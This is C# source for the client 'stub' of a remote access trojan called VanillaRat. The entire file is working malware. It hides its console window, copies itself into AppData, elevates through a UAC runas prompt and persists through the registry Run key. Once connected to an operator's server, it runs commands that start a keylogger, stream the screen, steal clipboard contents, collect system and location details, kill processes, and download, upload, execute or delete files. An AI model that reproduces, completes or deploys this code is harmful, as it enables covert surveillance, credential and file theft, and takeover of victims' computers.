﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using Telepathy;
using VanillaRatStub.InformationHelpers;
using static System.Windows.Forms.Application;
using Message = Telepathy.Message;
using ThreadState = System.Threading.ThreadState;

namespace VanillaRatStub
{
    internal class Program
    {
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        private static string CurrentDirectory = string.Empty;
        private static bool RDActive;
        private static bool USActive;
        private static bool KLActive;
        private static bool ARActive;
        private static bool ReceivingFile;
        private static string FileToWrite = "";
        private static int UpdateInterval;

        private static readonly string InstallDirectory =
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
            AppDomain.CurrentDomain.FriendlyName;

        private static ApplicationContext MsgLoop;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput,
            IntPtr lpInitData);

        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
            [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        internal static extern bool DeleteDC([In] IntPtr hdc);

        #region Connection & Data Loop
        //Try to connect to main server
        private static void Connect()
        {
            while (!Networking.MainClient.Connected)
            {
                Thread.Sleep(20);
                Networking.MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
            }

            while (Networking.MainClient.Connected)
            {
                Thread.Sleep(UpdateInterval);
                GetRecievedData();
            }
        }

        #endregion Connection & Data Loop

        #region Entry Point
        //Check if it is installed
        private static bool IsInstalled()
        {
            if (ExecutablePath == InstallDirectory)
                return true;
            return false;
        }
        //Raise to admin
        private static void RaisePerms()
        {
            Process P = new Process();
            P.StartInfo.FileName = ExecutablePath;
            P.StartInfo.UseShellExecute = true;
            P.StartInfo.Verb = "runas";
            P.Start();
            Environment.Exit(0);
        }
        //Check if admin
        private static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }
        //Check settings and start connect
        private static void Main(string[] args)
        {
            UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            if (ClientSettings.Install == "True" && !IsInstalled())
            {
                if (!IsAdmin())
                    RaisePerms();
                if (!IsInstalled())
                {
                    File.Copy(ExecutablePath, InstallDirectory, true);
                    Process.Start(InstallDirectory);
                    Environment.Exit(0);
                }
                else
                {
                    if (ClientSettings.Startup == "True")
                    {
                        RegistryKey RK =
                            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        try
                        {
                            RK.DeleteValue("VCLIENT", false);
                        }
                        catch
                        {
                        }

                        try
                        {
                            RK.SetValue("VCLIENT", ExecutablePath);
                        }
                        catch
                        {
                        }
                    }
                }
            }

            Connect();
            Console.ReadKey();
        }
        //Uninstall client
        private static void UninstallClient()
        {
            try
            {
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue("VCLIENT", false);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }

        #endregion Entry Point

        #region Data Handler & Grabber

        //Get data sent to client
        private static void GetRecievedData()
        {
            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Console.WriteLine("Connected");
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add(2); //Client Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add(14); //AntiVirus Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
                        Networking.MainClient.Send(ToSend.ToArray());
                        string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
                            .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
                        ToSend.Clear();
                        ToSend.Add(15); //Operating System Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(OperatingSystemUnDetailed));
                        Networking.MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        Console.WriteLine("Disconnected");
                        Connect();
                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        //Handle data sent to client
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private static void HandleData(byte[] RawData)
        {
            if (ReceivingFile)
            {
                try
                {
                    File.WriteAllBytes(FileToWrite, RawData);
                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }

                ReceivingFile = false;
                return;
            }

            string StringForm = string.Empty;
            Thread StreamThread = new Thread(StreamScreen);
            Thread UsageThread = new Thread(StreamUsage);
            Thread KeyloggerThread = new Thread(StreamKeys);
            KeyloggerThread.IsBackground = true;
            try
            {
                StringForm = Encoding.ASCII.GetString(RawData);
                Console.WriteLine("Command Recieved From " + ClientSettings.DNS + "   (" + StringForm + ")");
            }
            catch
            {
            }

            if (StringForm == "KillClient")
            {
                UninstallClient();
                Environment.Exit(0);
            }
            else if (StringForm == "DisconnectClient")
            {
                Networking.MainClient.Disconnect();
            }
            else if (StringForm == "ShowClientConsole")
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_SHOW);
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("Console has been shown to client."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Contains("MsgBox"))
            {
                string ToBreak = GetSubstringByString("(", ")", StringForm);
                string Text = GetSubstringByString("<", ">", ToBreak);
                string Header = GetSubstringByString("[", "]", ToBreak);
                string ButtonString = GetSubstringByString("{", "}", ToBreak);
                string IconString = GetSubstringByString("/", @"\", ToBreak);
                MessageBoxButtons MBB = MessageBoxButtons.OK;
                MessageBoxIcon MBI = MessageBoxIcon.None;

                #region Button & Icon conditional statements

                if (ButtonString.Equals("Abort Retry Ignore"))
                    MBB = MessageBoxButtons.AbortRetryIgnore;
                else if (ButtonString.Equals("OK"))
                    MBB = MessageBoxButtons.OK;
                else if (ButtonString.Equals("OK Cancel"))
                    MBB = MessageBoxButtons.OKCancel;
                else if (ButtonString.Equals("Retry Cancel"))
                    MBB = MessageBoxButtons.RetryCancel;
                else if (ButtonString.Equals("Yes No"))
                    MBB = MessageBoxButtons.YesNo;
                else if (ButtonString.Equals("Yes No Cancel")) MBB = MessageBoxButtons.YesNoCancel;

                if (IconString.Equals("Asterisk"))
                    MBI = MessageBoxIcon.Asterisk;
                else if (IconString.Equals("Error"))
                    MBI = MessageBoxIcon.Error;
                else if (IconString.Equals("Exclamation"))
                    MBI = MessageBoxIcon.Exclamation;
                else if (IconString.Equals("Hand"))
                    MBI = MessageBoxIcon.Hand;
                else if (IconString.Equals("Information"))
                    MBI = MessageBoxIcon.Information;
                else if (IconString.Equals("None"))
                    MBI = MessageBoxIcon.None;
                else if (IconString.Equals("Question"))
                    MBI = MessageBoxIcon.Question;
                else if (IconString.Equals("Stop"))
                    MBI = MessageBoxIcon.Stop;
                else if (IconString.Equals("Warning")) MBI = MessageBoxIcon.Warning;

                #endregion Button & Icon conditional statements

                MessageBox.Show(Text, Header, MBB, MBI);
            }
            else if (StringForm.Equals("StartRD"))
            {
                RDActive = true;
                if (StreamThread.ThreadState != ThreadState.Running) StreamThread.Start();
            }
            else if (StringForm.Equals("StopRD"))
            {
                RDActive = false;
                if (StreamThread.ThreadState == ThreadState.Running) StreamThread.Abort();
            }
            else if (StringForm.Equals("GetProcesses"))
            {
                Process[] PL = Process.GetProcesses();
                List<string> ProcessList = new List<string>();
                foreach (Process P in PL)
                    ProcessList.Add("{" + P.ProcessName + "}<" + P.Id + ">[" + P.MainWindowTitle + "]");
                string[] StringArray = ProcessList.ToArray<string>();
                List<byte> ToSend = new List<byte>();
                ToSend.Add(3); //Process List Type
                string ListString = "";
                foreach (string Process in StringArray) ListString += "][" + Process;
                ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Contains("EndProcess("))
            {
                string ToEnd = GetSubstringByString("(", ")", StringForm);
                try
                {
                    Process P = Process.GetProcessById(Convert.ToInt16(ToEnd));
                    string Name = P.ProcessName;
                    P.Kill();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The process " + P.ProcessName + " was killed."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("OpenWebsite("))
            {
                string ToOpen = GetSubstringByString("(", ")", StringForm);
                try
                {
                    Process.Start(ToOpen);
                }
                catch
                {
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("The website " + ToOpen + " was opened."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Equals("GetComputerInfo"))
            {
                string ListString = "";
                List<string> ComputerInfoList = new List<string>();
                ComputerInfo.GetGeoInfo();
                ComputerInfoList.Add("Computer Name: " + ComputerInfo.GetName());
                ComputerInfoList.Add("Computer CPU: " + ComputerInfo.GetCPU());
                ComputerInfoList.Add("Computer GPU: " + ComputerInfo.GetGPU());
                ComputerInfoList.Add("Computer Ram Amount (MB): " + ComputerInfo.GetRamAmount());
                ComputerInfoList.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
                ComputerInfoList.Add("Computer OS: " + ComputerInfo.GetWindowsVersion());
                ComputerInfoList.Add("Country: " + ComputerInfo.GeoInfo.Country);
                ComputerInfoList.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
                ComputerInfoList.Add("City: " + ComputerInfo.GeoInfo.City);
                foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
                List<byte> ToSend = new List<byte>();
                ToSend.Add(4); //Information Type
                ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Equals("RaisePerms"))
            {
                Process P = new Process();
                P.StartInfo.FileName = ExecutablePath;
                P.StartInfo.UseShellExecute = true;
                P.StartInfo.Verb = "runas";
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("Client is restarting in administration mode."));
                P.Start();
                Networking.MainClient.Send(ToSend.ToArray());
                Environment.Exit(0);
            }
            else if (StringForm.Contains("GetDF{"))
            {
                try
                {
                    string Directory = GetSubstringByString("{", "}", StringForm);
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    CurrentDirectory = Directory;
                    ToSend.Clear();
                    ToSend.Add(6); //Current Directory Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("GoUpDir"))
            {
                try
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(7); //Directory Up Type
                    CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                    ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("GetFile"))
            {
                try
                {
                    string FileString = GetSubstringByString("{", "}", StringForm);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                        FS.Close();
                    }

                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(8); //File Type
                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch (Exception EX)
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1);
                    ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
            }
            else if (StringForm.Contains("StartFileReceive{"))
            {
                try
                {
                    FileToWrite = GetSubstringByString("{", "}", StringForm);
                    var Stream = File.Create(FileToWrite);
                    Stream.Close();
                    ReceivingFile = true;
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("TryOpen{"))
            {
                string ToOpen = GetSubstringByString("{", "}", StringForm);
                try
                {
                    Process.Start(ToOpen);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("DeleteFile{"))
            {
                try
                {
                    string ToDelete = GetSubstringByString("{", "}", StringForm);
                    File.Delete(ToDelete);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
                    Networking.MainClient.Send(ToSend.ToArray());
                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    ToSend.Clear();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Equals("GetClipboard"))
            {
                try
                {
                    string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                    Thread STAThread = new Thread(
                        delegate()
                        {
                            if (Clipboard.ContainsText(TextDataFormat.Text))
                                ClipboardText = Clipboard.GetText(TextDataFormat.Text);
                        });
                    STAThread.SetApartmentState(ApartmentState.STA);
                    STAThread.Start();
                    STAThread.Join();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(9); //Clipboard Text Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Equals("StartUsageStream"))
            {
                USActive = true;
                if (UsageThread.ThreadState != ThreadState.Running) UsageThread.Start();
            }
            else if (StringForm.Equals("StopUsageStream"))
            {
                USActive = false;
                if (UsageThread.ThreadState == ThreadState.Running) UsageThread.Abort();
            }
            else if (StringForm.Equals("StartKL"))
            {
                Keylogger.SendKeys = true;
                KLActive = true;
                if (KeyloggerThread.ThreadState != ThreadState.Running) KeyloggerThread.Start();
            }
            else if (StringForm.Equals("StopKL"))
            {
                Keylogger.SendKeys = false;
                KLActive = false;
                if (KeyloggerThread.ThreadState == ThreadState.Running) KeyloggerThread.Abort();
            } else if (StringForm.Equals("StartAR"))
            {

            } else if (StringForm.Equals("StopAR"))
            {

            }
        }

        #region Audio Recorder        
        private static void RecordAudio()
        {

        }
        #endregion

        #region Remote Desktop

        //Stream screen to server
        private static void StreamScreen()
        {
            while (RDActive && Networking.MainClient.Connected)
            {
                byte[] ImageBytes = null;
                IUnsafeCodec UC = new UnsafeStreamCodec(75);
                Bitmap Image = GetDesktopImage();
                int Width = Image.Width;
                int Height = Image.Height;
                BitmapData BD = GetDesktopImage().LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
                    ImageLockMode.ReadWrite, Image.PixelFormat);
                using (MemoryStream MS = new MemoryStream())
                {
                    UC.CodeImage(BD.Scan0, new Rectangle(0, 0, Width, Height), new Size(Width, Height),
                        Image.PixelFormat, MS);
                    ImageBytes = MS.ToArray();
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add(0); //Image Type
                ToSend.AddRange(ImageBytes);
                Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(UpdateInterval);
            }
        }

        //Get image of desktop
        private static Bitmap GetDesktopImage()
        {
            Rectangle Bounds = Screen.PrimaryScreen.Bounds;
            Bitmap Screenshot = new Bitmap(Bounds.Width, Bounds.Height, PixelFormat.Format32bppPArgb);
            using (Graphics G = Graphics.FromImage(Screenshot))
            {
                IntPtr DestDeviceContext = G.GetHdc();
                IntPtr SrcDeviceContext = CreateDC("DISPLAY", null, null, IntPtr.Zero);
                BitBlt(DestDeviceContext, 0, 0, Bounds.Width, Bounds.Height, SrcDeviceContext, Bounds.X, Bounds.Y,
                    0x00CC0020);
                DeleteDC(SrcDeviceContext);
                G.ReleaseHdc(DestDeviceContext);
            }

            return Screenshot;
        }

        #endregion Remote Desktop

        #region KL

        //Stream keys to server 
        private static void StreamKeys()
        {
            Keylogger K = new Keylogger();
            K.InitKeylogger();
        }

        #endregion

        #region UsageStream

        //Stream hardware usage to server
        private static void StreamUsage()
        {
            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
            while (USActive && Networking.MainClient.Connected)
            {
                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                List<byte> ToSend = new List<byte>();
                ToSend.Add(10); //Hardware Usage Type
                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(500);
            }
        }

        #endregion UsageStream

        private static string GetSubstringByString(string a, string b, string c)
        {
            return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
        }

        #endregion Data Handler & Grabber
    }
}